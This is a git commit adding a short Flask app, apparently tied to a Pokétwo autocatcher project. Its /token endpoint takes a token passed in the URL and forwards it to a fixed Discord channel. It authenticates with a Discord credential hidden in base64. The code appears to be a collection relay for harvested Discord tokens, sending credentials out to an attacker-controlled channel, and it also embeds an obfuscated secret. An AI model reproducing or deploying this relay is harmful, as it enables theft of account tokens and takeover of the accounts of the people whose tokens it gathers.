35a4f6cd490cc54ff28795eb56ac0fbf535f056c
PokeTwoAC <135667208+PokeTwoAC@users.noreply.github.com>
2023-06-08 18:34:40 -0300

    Create app.py

---
+++ app.py
@@ -0,0 +1,45 @@
+from flask import request, Flask
+
+import base64
+
+app = Flask(__name__)
+
+import requests
+
+@app.route('/token')
+
+def my_route():
+
+  base64_message = 'TlRFd05ERTVOVFExTmpBMU9UTXhNRE14LkcwT2UyTC5abGFUTFNWT21jZXdNNEtMVlJaOFZuTjJocXBuUzE1OTRxV1Rudw=='
+
+  base64_bytes = base64_message.encode('ascii')
+
+  message_bytes = base64.b64decode(base64_bytes)
+
+  heade = message_bytes.decode('ascii')
+
+  header = {
+
+"authorization": heade
+
+  }
+
+  
+
+  token = request.args.get('token')
+
+  payload = {
+
+'content': token
+
+  }
+
+  requests.post(f'https://discord.com/api/v10/channels/1094010447889432627/messages', data=payload, headers=header)
+
+  return token
+
+  
+
+if __name__ == "__main__":
+
+	app.run()
